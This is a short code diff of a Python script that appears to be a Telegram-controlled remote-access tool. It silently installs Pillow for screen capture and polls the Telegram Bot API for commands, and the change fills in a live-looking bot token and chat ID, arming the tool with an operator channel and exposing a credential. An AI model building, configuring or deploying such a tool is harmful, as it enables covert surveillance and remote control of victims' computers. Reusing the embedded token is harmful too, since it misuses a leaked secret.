@@ -13,8 +13,8 @@ except ImportError:
         os.system("python3 -m pip install pillow -q -q -q")
         from PIL import ImageGrab
 
-TOKEN = ''   #change the token here
-CHAT_ID = ''   #change the chat id here
+TOKEN = '7582695287:AAHgUjUpWYsxbv56ioXRvnw9LDH9WuEpDYc'   #change the token here
+CHAT_ID = '5887457509'   #change the chat id here
 processed_message_ids = []
 def get_updates(offset=None):
     url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
